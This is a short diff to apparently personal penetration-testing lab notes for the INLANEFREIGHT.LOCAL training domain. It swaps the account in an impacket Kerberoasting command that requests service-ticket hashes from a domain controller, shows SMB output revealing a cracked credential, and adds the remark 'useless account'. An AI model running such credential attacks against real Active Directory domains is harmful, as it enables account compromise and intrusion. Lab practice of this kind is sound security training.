@@ -1933,7 +1933,7 @@ sAMAccountName: vmwarescvc
 ## Kerberoasting
 
 ```bash
-impacket-GetUserSPNs INLANEFREIGHT.LOCAL/backupadm -dc-ip 172.16.8.3 -request -outputfile spn.hash       
+impacket-GetUserSPNs INLANEFREIGHT.LOCAL/hporter -dc-ip 172.16.8.3 -request -outputfile spn.hash       
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 Password:
@@ -2001,3 +2001,6 @@ SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019
 SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 
                                                                                               
 ```
+
+useless account
+
